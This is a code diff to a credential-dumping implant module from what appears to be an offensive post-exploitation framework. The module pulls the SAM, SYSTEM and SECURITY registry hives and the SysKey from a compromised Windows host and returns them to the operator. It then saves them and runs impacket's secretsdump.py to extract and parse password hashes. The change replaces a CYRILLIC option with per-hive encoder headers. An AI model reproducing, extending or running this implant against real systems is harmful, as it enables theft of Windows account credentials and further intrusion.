@@ -10,7 +10,6 @@ class HashDumpSAMImplant(core.implant.Implant):
         self.options.register("LPATH", "/tmp/", "local file save path")
         self.options.register("RPATH", "%TEMP%", "remote file save path")
         self.options.register("GETSYSHIVE", "false", "Retrieve the system hive? (slower, but more reliable)",enum=["true", "false"])
-        self.options.register("CYRILLIC", "false", "Is cyrillic in the results?", enum=["true", "false"], advanced=True)
 
     def run(self):
 
@@ -46,24 +45,25 @@ class HashDumpSAMImplant(core.implant.Implant):
 
 class HashDumpSAMJob(core.job.Job):
 
-    def save_file(self, data, name):
+    def save_file(self, data, name, encoder):
         import uuid
         save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
         save_fname = save_fname.replace("//", "/")
 
         with open(save_fname, "wb") as f:
-            data = self.decode_downloaded_data(data)
+            data = self.decode_downloaded_data(data, encoder)
             f.write(data)
 
         return save_fname
 
     def report(self, handler, data, sanitize = False):
-        task =  handler.get_header("Task", False)
+        task = handler.get_header("Task", False)
 
         if task == "SAM":
             handler.reply(200)
             self.print_status("received SAM hive (%d bytes)" % len(data))
             self.sam_data = data
+            self.sam_encoder = handler.get_header("encoder", 1252)
             return
 
         if task == "SYSTEM":
@@ -71,6 +71,7 @@ class HashDumpSAMJob(core.job.Job):
 
             self.print_status("received SYSTEM hive (%d bytes)" % len(data))
             self.system_data = data
+            self.system_encoder = handler.get_header("encoder", 1252)
             return
 
         if task == "SysKey":
@@ -79,6 +80,7 @@ class HashDumpSAMJob(core.job.Job):
             self.print_status("received SysKey (%d bytes)" % len(data))
             self.syskey_data = data
             self.system_data = ""
+            self.syskey_encoder = handler.get_header("encoder", 1252)
             return
 
         if task == "SECURITY":
@@ -86,6 +88,7 @@ class HashDumpSAMJob(core.job.Job):
 
             self.print_status("received SECURITY hive (%d bytes)" % len(data))
             self.security_data = data
+            self.security_encoder = handler.get_header("encoder", 1252)
             return
 
         # dump sam here
@@ -100,18 +103,18 @@ class HashDumpSAMJob(core.job.Job):
         from subprocess import Popen, PIPE, STDOUT
         path = "data/impacket/examples/secretsdump.py"
 
-        self.sam_file = self.save_file(self.sam_data, "SAM")
+        self.sam_file = self.save_file(self.sam_data, "SAM", self.sam_encoder)
         self.print_status("decoded SAM hive (%s)" % self.sam_file)
 
-        self.security_file = self.save_file(self.security_data, "SECURITY")
+        self.security_file = self.save_file(self.security_data, "SECURITY", self.security_encoder)
         self.print_status("decoded SECURITY hive (%s)" % self.security_file)
 
         if self.system_data:
-            self.system_file = self.save_file(self.system_data, "SYSTEM")
+            self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
             self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
             cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         else:
-            self.syskey_data_file = self.save_file(self.syskey_data, "SYSKEY")
+            self.syskey_data_file = self.save_file(self.syskey_data, "SYSKEY", self.syskey_encoder)
 
             tmp_syskey = ""
             self.syskey = ""
@@ -145,7 +148,6 @@ class HashDumpSAMJob(core.job.Job):
         output = p.stdout.read().decode()
         self.shell.print_plain(output)
         self.results = output
-        self.shell.print_warning("If you get a 'KeyName' error above, try setting CYRILLIC to true and running again!")
 
         cp = core.cred_parser.CredParse(self)
         cp.parse_hashdump_sam(output)
